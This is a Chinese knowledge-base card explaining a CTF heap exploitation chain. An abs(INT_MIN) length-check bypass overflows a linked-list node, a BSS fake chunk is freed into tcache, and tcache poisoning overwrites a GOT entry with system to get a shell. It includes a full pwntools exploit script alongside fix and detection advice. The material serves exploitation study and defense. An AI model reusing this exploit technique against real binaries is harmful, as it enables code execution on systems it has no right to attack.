---
id: binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got
title: abs(INT_MIN) 长度校验绕过堆溢出：BSS 伪造 chunk 投毒 tcache 劫持 GOT
type: scenario
domain: binary
path: binary/pwn/heap
technique: abs-intmin-length-bypass-bss-fake-chunk-tcache-poison-got-hijack
tags:
- pwn
- heap
- heap-overflow
- integer-signedness
- tcache
- tcache-poisoning
- got-hijack
- bss
- custom-linked-list
- partial-relro
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V101
  verified_at: '2026-11-05T22:24:35+08:00'
  notes: 已对照原文核对：abs(INT_MIN)%0x18=-8、17轮魔改TEA(delta 0x9E3879B9/key 0x114514)、0x18填充覆盖next、头插链表clear遍历free、BSS 0x31假chunk、tcache投毒到GOT及0x40670偏移均与原文一致；未独立复跑，原文未点明被覆写的GOT符号（卡片已标注需按附件确认）。
url: /docs/binary/pwn/heap/binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got/
draft: false
kb_aliases:
- abs(INT_MIN)
- INT_MIN 取绝对值溢出
- 有符号长度转无符号
- 负数长度绕过
- BSS fake chunk
- tcache poisoning GOT
- odd_chat
---

## 一句话结论

当菜单程序用 `abs32(choice) % 0x18` 计算消息长度、再把结果交给按无符号长度读取的函数时，输入 `-2147483648` 会让 `abs` 溢出得到 `INT_MIN`、取模得到 `-8`，转为 `size_t` 后成为超大长度，从而越界覆盖 `malloc(0x20)` 聊天节点的 `next` 指针；随后把头插链表的 `next` 指向 BSS 中伪造的 `0x31` chunk，借 `clear_chat_history` 把它释放进 tcache，再用改名写覆盖其 `fd` 完成 tcache 投毒，最终分配到 GOT 并把 `system` 写入，触发 shell。

## 原理

- **长度计算缺陷**：`requested_len = (int)abs32(read_menu_choice()) % 0x18;`。对 32 位有符号数取绝对值时，`abs(INT_MIN)` 的结果仍是 `INT_MIN`（`-2147483648` 取负在 32 位下溢出回自身）。`INT_MIN % 24` 在 C 的截断除法下等于 `-8`。负的 `requested_len` 传入 `read_line_raw(..., requested_len)` 时被转换成无符号长度，实际允许写入接近 `SIZE_MAX` 字节；程序本来只想允许最多 `0x17` 字节。
- **节点结构**：消息节点由 `malloc(0x20)` 分配，请求 0x20 时 glibc 实际 chunk size 为 0x30、可用 0x28 字节；节点布局可视为 `char encrypted_text[0x18]` 后紧跟 `next` 指针（偏移 0x18）。正常长度上限 `0x17` 不会碰到 `next`；超长读取写入 `0x18` 字节填充后正好覆盖 `next`。
- **加密不是障碍**：用户消息在写入前会被原地做 17 轮魔改 TEA 分组加密（8 字节一组，delta 以原文 exp 为准为 `0x9E3879B9`，key 为 `0x114514`）。攻击者只需在发送前用同一密钥做逆变换 `decode(payload)`，程序加密后落盘的就是期望的明文布局，即 `encrypt(decode(x)) == x`。
- **自定义链表与释放**：链表采用头插法，新节点成为 `g_chat_history_head`；`clear_chat_history` 从头遍历，按 `current->next` 逐个 `free`，最后把 head 置空（本身没有 UAF）。因此只要覆盖某个节点的 `next`，就能让释放循环把任意地址当作节点去 `free`。
- **BSS 伪造 chunk**：改名牌函数 `fgets(g_user_name, 0x30, stdin)` 可向 BSS 全局区写入最多 0x2f 字节。攻击者借此在全局变量处布置 `prev_size=0, size=0x31` 的假 chunk，再让链表 `next` 指向它；`clear_chat_history` 会对该假 chunk 调用 `free`，把它放进 size 0x30 的 tcache bin。
- **tcache 投毒到 GOT**：假 chunk 被释放后，其用户区前 8 字节 `fd` 可由改名写入覆盖。把 `fd` 改成目标 GOT 项地址（Partial RELRO，GOT 可写且 No PIE 提供固定地址），之后连续两次 `malloc(0x20)`：第一次返回假 chunk，第二次返回 GOT 地址；第二次分配写入的内容就是函数指针。
- **泄露与触发**：原文先把某个节点的 `next` 指向 GOT，`show_chat_history` 会把 GOT 内容当节点消息打印，从输出中读 6 字节即得 libc 函数地址（原文按偏移 `0x40670` 算基址）。最后把菜单解析用的 GOT 项覆写为 `system`，再向菜单输入 `/bin/sh`，程序以该字符串调用被劫持函数即执行 shell。具体 GOT 符号原文未点名，需按附件确认（从流程看是菜单读取所调用的解析函数，如 `atoi`）。
- **边界**：需要 Partial RELRO/No PIE 或已知 GOT 地址；高版本 glibc 的 safe-linking 会编码 tcache `fd`，需要先泄露堆地址；若目标为 Full RELRO 则 GOT 只读，需要改打 `__free_hook`/`exit_funcs`/FSOP 等；BSS 假 chunk 的 size 必须合法且地址对齐，否则 `free` 会报错。

## 触发条件

- 程序提供“发送消息”功能，长度由有符号整数经 `abs` 和取模计算，并直接作为读取长度；节点缓冲区大小固定且 `next` 指针紧随其后。
- 输入可触及 `-2147483648`（或任何使 `abs` 溢出/取模为负的值），且读取函数把负长度当作无符号大数。
- 程序有可控的“改名/写全局缓冲区”功能（如 `fgets(g_user_name, 0x30, ...)`），能在 BSS 布置假 chunk。
- 链表释放逻辑按攻击者可控的 `next` 遍历并 `free`，或存在等价的任意释放原语。
- 目标为 Partial RELRO/No PIE（GOT 可写、地址固定），或已获得 libc/堆地址用于绕过 safe-linking。
- 消息写入前有分组加密时，攻击者已逆向出可逆的加密算法，能构造 `decode(desired)` 输入。

## 利用步骤

1. 逆向菜单与节点结构：确认 `malloc(0x20)`、`encrypted_text[0x18] + next`、头插法、`clear_chat_history` 的遍历释放顺序。
2. 逆向加密：确认 8 字节分组、轮数、delta 与 key，写出 `decode()`；所有期望写入内存的字节都先 `decode()` 再发送。
3. 泄露 libc：构造 `0x18` 填充 + `p64(GOT_entry)`，发送后调用 `show`，读回 GOT 中的函数地址并按已知偏移算 libc 基址（原文 `0x40670`）。
4. 布置假 chunk：用改名牌写入 `p64(0) + p64(0x31)`，在 BSS 全局变量处形成合法 size 的假 chunk。
5. 入 tcache：再次利用长度绕过把某个节点的 `next` 指向假 chunk（原文还调整了指向假 chunk 内部的位置），调用 `clear_chat_history`，使假 chunk 被 `free` 进 size 0x30 的 tcache bin。
6. 投毒：释放后再次用改名写入假 chunk 的 `fd`，指向目标 GOT 项。
7. 分配并覆写：连续两次 `add(0x20, ...)`，第二次分配到 GOT；写入 `decode(p64(system))`，让加密后的 8 字节正好是 `system` 地址。
8. 触发：向菜单输入 `/bin/sh\x00`，被覆写的解析函数（如 `atoi`）收到该字符串即调用 `system("/bin/sh")`。

## PoC

原文 exp 的关键片段（仅保留链路段，未在本机执行；delta 以原文 exp 的 `0x9E3879B9` 为准）：

```python
from pwn import *
import struct

io = process('./attachment')
context.arch = 'amd64'

TEA_DELTA = 0x9E3879B9   # 反编译中的 sum -= 0x61C78647 的等价负数
TEA_KEY   = 0x114514
ROUNDS    = 17

def u32(b): return struct.unpack('<I', b)[0]
def p32(x): return struct.pack('<I', x & 0xFFFFFFFF)

def decode2(block):
    left, right = u32(block[:4]), u32(block[4:])
    total = (TEA_DELTA * ROUNDS) & 0xFFFFFFFF
    for _ in range(ROUNDS):
        right = (right - (((left << 4) + TEA_KEY) ^ (left + total) ^ ((left >> 5) + TEA_KEY))) & 0xFFFFFFFF
        total = (total - TEA_DELTA) & 0xFFFFFFFF
        left = (left - (((right << 4) + TEA_KEY) ^ (right + total) ^ ((right >> 5) + TEA_KEY))) & 0xFFFFFFFF
    return p32(left) + p32(right)

def decode(content):
    if len(content) % 8:
        content += b'\x00' * (8 - len(content) % 8)
    return b''.join(decode2(content[i:i+8]) for i in range(0, len(content), 8))

def name():                       # 选项 2：写 g_user_name
    io.recvuntil(b"Please enter your name: "); io.sendline(b'ziran')

def add(size, content):           # 选项 1：长度绕过 + 覆盖 next
    io.recvuntil(b">> "); io.sendline(b'1')
    io.recvuntil(b"How many characters do you want to send: "); io.sendline(str(size).encode())
    io.recvuntil(b"> "); io.sendline(content)

def edit(content):
    io.recvuntil(b">> "); io.sendline(b'2')
    io.recvuntil(b"Please enter your name: "); io.sendline(content)

def show():
    io.recvuntil(b">> "); io.sendline(b'3')

def delete():
    io.recvuntil(b">> "); io.sendline(b'4')

# 1) 把节点 next 指向 GOT，show 泄露 libc（GOT 地址需按附件确认）
name()
add(-2147483648, decode(b'a' * 0x18 + p64(0x602060)))
add(-2147483648, decode(b'a' * 0x18 + p64(0x602060)))
show()
io.recvuntil(b"[#1] User: ziran\n"); io.recvuntil(b'> ')
libc = u64(io.recv(6).ljust(8, b'\x00')) - 0x40670

# 2) 在 BSS 布置假 chunk，并让它被 free 进 tcache
edit(p64(0) + p64(0x31))
add(-2147483648, decode(b'a' * 0x18 + p64(0x6020F0 + 0x10 + 0x10)))
delete()
delete()

# 3) 取出假 chunk，再释放并投毒 fd 到 GOT
add(0x10, decode(b'a' * 0x8))
delete()
edit(p64(0) + p64(0x30) + p64(0x602060))   # 原文此处指向 GOT

# 4) 第二次 malloc 落到 GOT，写入 system
libc_elf = ELF('./libc.so.6')
add(0x10, decode(p64(libc + libc_elf.sym['system'])))
io.sendline(b'/bin/sh\x00')
io.interactive()
```

## 变体与关联

- **长度缺陷变体**：`abs(INT_MIN)`、`INT_MIN` 取负、`-1` 传入无符号长度、`atoi` 返回负数后与 `size_t` 比较、`%` 负数取模等，都是“有符号校验通过、无符号使用放大”的同类问题。
- **任意释放变体**：若程序不是链表，而是数组/树/回调，也可以把指针改成 BSS 假 chunk 后触发 free；关键是把“攻击者可控指针 + free”变成“把假 chunk 放入 tcache”。
- **不落 GOT 的变体**：Full RELRO 或高版本 glibc 下可改为投毒 `__free_hook`（2.34 前）、`exit_funcs`/FSOP、栈上 `environ` 做 ROP；有 safe-linking 时 `fd` 需按 `(chunk_addr >> 12) ^ target` 编码。
- **关联卡片**：[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（tcache 投毒打 GOT 的另一实现）、[[binary-pwn-heap-house-of-botcake-tcache-poison]]（tcache 投毒/双释放绕过）、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（tcache 投毒到栈环境变量）。
- **边界**：原文 exp 依赖题目固定的 GOT 地址、libc 偏移 `0x40670` 和 glibc 版本；未在本机复跑，实际需按附件符号与 libc 调整。

## 检测与防御

- **代码修复**：长度计算全程使用 `size_t` 或无符号类型，并在 `abs` 前检查 `INT_MIN`；对取模结果做下界检查；读取函数必须使用真实缓冲区容量，禁止把有符号结果直接转无符号长度；节点结构使用固定上限并在写入前校验。
- **堆加固**：升级 glibc 启用 safe-linking、tcache key 随机化；开启 Full RELRO 使 GOT 只读；开启 PIE/ASLR；使用 `MALLOC_CHECK_`/`FORTIFY_SOURCE`/ASAN 观测堆破坏。
- **运行时检测**：监控 `free` 非堆地址（BSS 假 chunk）、tcache `fd` 指向非堆地址、GOT 页写入；对菜单输入 `-2147483648` 等边界值做审计。
- **CTF 环境**：限制远程二进制暴露的 libc；对异常长度/负数输入直接拒绝；使用较新 glibc 提高利用门槛。
